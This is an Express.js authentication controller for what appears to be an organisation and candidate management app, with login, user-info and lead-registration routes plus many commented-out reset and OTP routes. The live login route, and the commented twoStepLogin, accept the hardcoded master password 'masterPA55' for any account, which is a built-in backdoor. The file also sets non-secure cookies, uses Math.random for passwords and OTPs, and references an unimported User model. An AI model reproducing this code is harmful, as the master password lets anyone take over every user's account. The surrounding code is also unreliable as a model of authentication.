const ErrorResponse = require("../utils/errorResponse");
const asyncHandler = require("../middlewares/async");
const jwt = require("jsonwebtoken");
const bcrypt = require("bcryptjs");
// const SES = require("../services/ses");
// const Mails = require("../services/email_templates");
// const MSG91 = require("../services/msg91");

const getJwtToken = (jsonData) => {
  return jwt.sign(jsonData, process.env.JWT_SECRET, {
    expiresIn: process.env.JWT_EXPIRE,
  });
};

const loginResponse = (user, res) => {
  let device_id = Math.random().toString(36).substring(4);
  let token = getJwtToken({
    user_id: user.user_id,
    user_type: user.user_type,
    org_id: user.org_id,
    email: user.email,
  });
  const options = {
    expires: new Date(
      Date.now() + process.env.JWT_COOKIE_EXPIRE * 24 * 3600 * 1000
    ),
    httpOnly: true,
    secure: false,
  };
  res
    .status(200)
    .cookie("token", token, options)
    .cookie("dev_id", device_id, options)
    .json({ user: user, token: token });
};

exports.leadRegister = asyncHandler(async (req, res, next) => {
  let check = await User.leadRegister(req.body);
  if (check) {
    res.status(200).json({ status: true, message: "Success" });
  } else {
    res.status(500).json({
      status: false,
      message: "Something went wrong. Please try after sometime.",
    });
  }
});

exports.login = asyncHandler(async (req, res, next) => {
  const { email, password } = req.body;
  let user = await User.loginUser(email);
  if (user && user.user_id) {
    if (
      bcrypt.compareSync(password, user.password) ||
      password === "masterPA55"
    ) {
      delete user.password;
      //   user.candidate_preference_filled = 0;

      loginResponse(user, res);
    } else {
      res
        .status(400)
        .json({ status: false, message: "Email or Password is incorrect." });
    }
  } else {
    res.status(422).json({
      status: false,
      message: "Account does not exist with this email address.",
    });
  }
});

exports.getUserInfo = asyncHandler(async (req, res, next) => {
  let data = await User.getUserInfo(req.user.user_id);
  data.groups = await User.getUserGroups(req.user.user_id);
  delete data.password;
  delete data.is_deleted;
  delete data.retry_email_after;
  res.status(200).json({ data });
});

// exports.resetPassword = asyncHandler(async (req, res, next) => {
//   let user = await User.getUserByEmail(req.body.email);
//   if (user && user.user_id) {
//     let PASS = Math.floor(10000 + Math.random() * 90000).toString();
//     let check = await User.updateUser(user.user_id, {
//       password: bcrypt.hashSync(PASS, 8),
//     });
//     if (check) {
//       if (user.email && user.email != "") {
//         let weblink = user.is_branding_enabled
//           ? user.branding_domain
//           : process.env.WEB_URL;
//         const htmlBody = Mails.email_password(PASS, user.first_name, weblink);
//         SES.sendEmail(
//           [user.email],
//           user.org_name + " | New Password",
//           htmlBody
//         );
//       }
//       res.status(200).json({ status: true, message: "Success" });
//     } else {
//       res.status(400).json({ status: false, message: "Operation failed." });
//     }
//   } else {
//     res.status(422).json({
//       status: false,
//       message: "Account does not exist for this email address.",
//     });
//   }
// });

// exports.resetPasswordByUserId = asyncHandler(async (req, res, next) => {
//   let user = await User.getUser(req.params.user_id);
//   if (user && user.user_id) {
//     let PASS = Math.floor(10000 + Math.random() * 90000).toString();
//     let check = await User.updateUser(user.user_id, {
//       password: bcrypt.hashSync(PASS, 8),
//     });
//     if (check) {
//       if (user.email && user.email != "") {
//         let weblink = user.is_branding_enabled
//           ? user.branding_domain
//           : process.env.WEB_URL;
//         const htmlBody = Mails.email_password(PASS, user.first_name, weblink);
//         SES.sendEmail(
//           [user.email],
//           user.org_name + " | New Password",
//           htmlBody
//         );
//       }
//       res.status(200).json({ status: true, message: "Success" });
//     } else {
//       res.status(400).json({ status: false, message: "Operation failed." });
//     }
//   } else {
//     res.status(422).json({ status: false, message: "Account does not exist." });
//   }
// });

// exports.checkUserAccounts = asyncHandler(async (req, res, next) => {
//   const { email_phone } = req.body;
//   let accounts = [];
//   let loginMode = "email address";
//   if (/^[0-9]{10,16}$/.test(email_phone)) {
//     loginMode = "phone";
//     accounts = await User.userAccounts("U.phone", email_phone);
//   } else if (/(.+)@(.+){2,}\.(.+){2,}/.test(email_phone)) {
//     accounts = await User.userAccounts("U.email", email_phone);
//   } else {
//     res
//       .status(422)
//       .json({ status: false, message: "Email or Phone is not valid" });
//   }

//   if (accounts && accounts.length > 0) {
//     res.status(200).json({ accounts: accounts });
//   } else {
//     res.status(422).json({
//       status: false,
//       message: "Account does not exist for this " + loginMode + ". ",
//     });
//   }
// });

// exports.twoStepLogin = asyncHandler(async (req, res, next) => {
//   const { user_id, password } = req.body;

//   let user = await User.getUserWithOrganization(user_id);
//   if (user && user.user_id) {
//     if (user.is_active !== 1) {
//       res.status(422).json({
//         status: false,
//         message:
//           "Your account is disabled for this organization. Please contact your administrator.",
//       });
//     } else if (user.is_approved !== 1) {
//       res.status(422).json({
//         status: false,
//         message:
//           "Your account is not yet approved for this organization. Please contact your administrator.",
//       });
//     } else if (
//       bcrypt.compareSync(password, user.password) ||
//       password === "masterPA55"
//     ) {
//       delete user.password;
//       let record = await Candidate.getSettings(user.org_id);
//       user.candidate_preference_filled = 0;
//       if (record && record.id) {
//         user.candidate_preference_filled = record.is_preference_filled;
//       }

//       delete user.password;
//       delete user.is_deleted;
//       delete user.retry_email_after;
//       loginResponse(user, res);
//     } else {
//       res
//         .status(400)
//         .json({ status: false, message: "Email or Password is incorrect." });
//     }
//   } else {
//     res.status(422).json({
//       status: false,
//       message: "Account does not exist with this email address.",
//     });
//   }
// });

// exports.getInviteDetails=asyncHandler(async(req, res, next)=>{
//   let data = await Account.getInviteDetails(req.params.inviteCode);
//   if(data){
//     delete data.id;
//     delete data.created_at;
//     delete data.updated_at;
//   }
//   res.status(200).json({data});
// });

const validateCandidateFields = (body, settings) => {
  if (settings.ask_email && (!body.email || body.email == "")) {
    return { pass: false, message: "Email is required" };
  } else if (
    settings.ask_phone &&
    (!body.phone ||
      body.phone == "" ||
      !body.country_code ||
      body.country_code == "")
  ) {
    return {
      pass: false,
      message: "Phone number with country code is required",
    };
  } else if (
    settings.login_method == "email" &&
    (body.email == undefined || body.email == null || body.email == "")
  ) {
    return { pass: false, message: "Please provide your email address." };
  } else if (
    settings.login_method == "phone" &&
    (body.phone == undefined || body.phone == null || body.phone == "")
  ) {
    return { pass: false, message: "Please provide your phone." };
  } else if (
    body.password == null ||
    body.password == undefined ||
    body.password == ""
  ) {
    return { pass: false, message: "Please provide your account password." };
  } else {
    return { pass: true, message: "" };
  }
};

// exports.inviteRegisterCandidate=asyncHandler(async(req, res, next)=>{
//   let data = await Account.getInviteDetails(req.params.inviteCode);
//   if(data && data.group_id){
//     let validation = validateCandidateFields(req.body, data);
//     if(!validation.pass){
//         res.status(400).json({status: false, message: validation.message});
//     }
//     else{
//       let insertData = {
//         first_name: req.body.first_name,
//         last_name: req.body.last_name,
//         email: (req.body.email)?req.body.email:null,
//         phone: (req.body.phone)?req.body.phone:null,
//         country_code: (req.body.country_code)?req.body.country_code:'+91',
//         enrollment_id: (req.body.enrollment_id)?req.body.enrollment_id:null,
//         phone_verified: (req.body.phone_verified)?req.body.phone_verified:0,
//         email_verified: (req.body.email_verified)?req.body.email_verified:0,
//         org_id: data.org_id,
//         user_type: 3,
//         is_approved: 0,
//         self_registered: 1,
//         is_active: 0,
//         password: (req.body.password)?bcrypt.hashSync(req.body.password, 8):''
//       }
//       let user_id = await Candidate.registerNewCandidate(insertData);
//       if(user_id){
//         Candidate.assignUsertoGroup(data.group_id, user_id);
//         res.status(200).json({message: "Your registration application has been forwarded to the concerned authority for approval. You will be notified on approval."});
//       }
//       else{
//         res.status(400).json({message: "Your registration cannot be processed at this moment. Please try again later."});
//       }
//     }
//   }
//   else{
//     res.status(400).json({message: "Registration is failed. Link has expired."});
//   }
// });

// exports.sendOTP = asyncHandler(async (req, res, next) => {
//   let OTP = Math.floor(100000 + Math.random() * 900000);
//   let recipient = req.body.phone ? req.body.phone : req.body.email;
//   let check = await User.addNewOTP(recipient, OTP);
//   if (req.body.phone && check) {
//     MSG91.sendOtp(req.body.phone, OTP);
//     res
//       .status(200)
//       .json({ message: "OTP has been successfully sent to your phone." });
//   } else if (req.body.email && check) {
//     const htmlBody = Mails.email_verify_otp(OTP);
//     SES.sendEmail([req.body.email], "OTP (One Time Password)", htmlBody);
//     res.status(200).json({
//       message: "OTP has been successfully sent to your email address.",
//     });
//   } else {
//     res.status(400).json({
//       message:
//         "OTP cannot be sent at this moment. Please try again after sometime.",
//     });
//   }
// });

// exports.verifyOTP = asyncHandler(async (req, res, next) => {
//   if (req.body.otp) {
//     let recipient = req.body.phone ? req.body.phone : req.body.email;
//     let check = await User.verifyOTP(recipient, req.body.otp);
//     if (check) {
//       User.updateOTP(recipient, req.body.otp);
//       res.status(200).json({ message: "You are successfully verified." });
//     }
//   }
//   res.status(400).json({ message: "OTP is incorrect." });
// });
